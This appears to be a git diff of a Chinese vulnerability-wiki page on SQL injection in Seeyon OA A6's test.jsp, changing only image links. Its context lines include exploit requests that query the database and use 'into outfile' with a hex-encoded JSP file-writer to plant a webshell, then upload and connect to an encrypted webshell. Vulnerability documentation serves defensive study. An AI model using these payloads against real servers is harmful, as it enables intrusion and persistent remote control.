@@ -24,13 +24,13 @@
 http://xxx.xxx.xxx.xxx/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database())
 ```
 
-![](image/zhiyuan-25.png)
+![](http://wikioss.peiqi.tech/vuln/zhiyuan-25.png)
 
 返回了当前使用的数据库
 
 要想写入shell需要知道写入的路径
 
-![](image/zhiyuan-26.png)
+![](http://wikioss.peiqi.tech/vuln/zhiyuan-26.png)
 
 这里得到路径 D:\Program Files\UFseeyon\OA\mysql\bin\..\
 
@@ -48,7 +48,7 @@ HEX编码
 http://xxx.xxx.xxx.xxx/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27E:/Program Files/UFseeyon/OA/tomcat/webapps/yyoa/peiqi_upload.jsp%27
 ```
 
-![](image/zhiyuan-27.png)
+![](http://wikioss.peiqi.tech/vuln/zhiyuan-27.png)
 
 显示上图则上传成功，访问 peiqi_upload.jsp 为空白不报错页面不存在就是上传成功
 
@@ -58,7 +58,7 @@ http://xxx.xxx.xxx.xxx/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex
 >
 > 注意上传的webshell需要url编码一下
 
-![](image/zhiyuan-28.png)
+![](http://wikioss.peiqi.tech/vuln/zhiyuan-28.png)
 
 ```
 http://xxx.xxx.xxx.xxx/yyoa/peiqi_upload.jsp?f=peiqiwebshell.jsp
@@ -68,7 +68,7 @@ t=%3C%25%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*
 
 连接木马
 
-![](image/zhiyuan-29.png)
+![](http://wikioss.peiqi.tech/vuln/zhiyuan-29.png)
 
 ## 漏洞利用POC
 
@@ -153,7 +153,7 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-![](image/zhiyuan-30.png)
+![](http://wikioss.peiqi.tech/vuln/zhiyuan-30.png)
 
 > [!NOTE]
 >
@@ -210,7 +210,7 @@ if __name__ == '__main__':
     Scan(file_name)
 ```
 
-![](image/zhiyuan-31.png)
+![](http://wikioss.peiqi.tech/vuln/zhiyuan-31.png)
 
 ## Goby & POC
 
@@ -218,4 +218,4 @@ if __name__ == '__main__':
 >
 > Seeyon_OA_A6_test.jsp_SQL_injection
 
-![](image/zhiyuan-42.png)
+![](http://wikioss.peiqi.tech/vuln/zhiyuan-42.png)
